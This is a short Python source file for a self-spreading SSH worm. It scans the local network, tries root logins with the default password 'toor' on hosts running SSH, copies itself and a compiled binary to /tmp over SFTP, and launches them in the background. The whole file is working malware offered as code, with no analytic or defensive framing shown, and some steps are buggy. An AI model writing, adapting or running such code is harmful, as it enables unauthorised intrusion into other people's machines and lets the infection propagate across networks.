import paramiko
import os
import socket
from scanner import map_network

class Worm:
    def __init__(self):
        print(socket.gethostbyname(socket.gethostname()))

        ips = map_network()
        for ip in ips:
            ret = self.is_ssh_running(ip)
            if ret:
                self.attack(ip)

    def is_ssh_running(self, ipaddr):
        sock = socket.socket()
        sock.settimeout(0.5)
        try:
            sock.connect((ipaddr, 22))
        except socket.error:
            return 0
        return 1

    def attack(self, ipaddr):
        print("[+] Attacking Host : %s "%ipaddr)

        ssh = paramiko.SSHClient()

        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(ipaddr, username='root', password='toor')
        except paramiko.AuthenticationException:
            print("[-] Failed!...")
        self.upload(ssh,'root','toor')

    def upload(self, sshcon, user, passw):
        sftp_client = sshcon.open_sftp()
        sftp_client.put('worm.py', '/tmp/worm.py')
        sftp_client.put('scanner.py', '/tmp/scanner.py')
        sftp_client.put('/dist/worm', '/tmp/worm')
        sshcon.exec_command('chmod a+x /tmp/worm.py')
        sshcon.exec_command('cd /tmp/')
        sshcon.exec_command('nohup worm &')  

if __name__ == "__main__":
    w = Worm()

